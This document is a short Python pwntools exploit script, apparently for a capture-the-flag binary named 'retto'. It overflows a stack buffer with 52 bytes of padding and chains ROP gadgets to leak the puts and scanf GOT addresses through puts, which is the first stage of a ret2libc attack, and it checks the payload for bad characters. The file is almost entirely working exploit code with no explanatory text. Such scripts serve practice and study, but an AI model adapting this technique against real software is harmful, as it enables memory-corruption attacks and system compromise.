#!/usr/bin/env python3

from struct import pack, unpack
from pwn import *
import sys

target = process('./retto')

p64 = lambda x: pack("Q", x)
u64 = lambda x: unpack("Q", x)[0]

def checkTerms(term, payload):
    if term in payload:
        print("Found", hex(ord(term)), "in payload, exit.")
        sys.exit(0)

start       = 0x401060
puts_plt    = 0x401030
puts_got    = 0x404018
scanf_got   = 0x404028
perc_s      = 0x402108
pop_rdi     = 0x40122b
pop_rsi_r15 = 0x401229

buf = b'A' * 52
buf += p64(pop_rdi)
buf += p64(perc_s)
buf += p64(pop_rsi_r15)
buf += p64(puts_got)
buf += p64(puts_got)
buf += p64(puts_plt)

buf += p64(pop_rdi)
buf += p64(perc_s)
buf += p64(pop_rsi_r15)
buf += p64(scanf_got)
buf += p64(scanf_got)
buf += p64(puts_plt)

buf += p64(start)
checkTerms(b'\n', buf)
buf += b'\n'
checkTerms(b'\x20', buf)

print("[i] Payload Ready.")
print(target.recv(1024))
target.sendline(buf)
print("[i] Payload sent.")
resp = target.recv(1024)
print("[i] Reply Recieved.")
print(resp)

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA











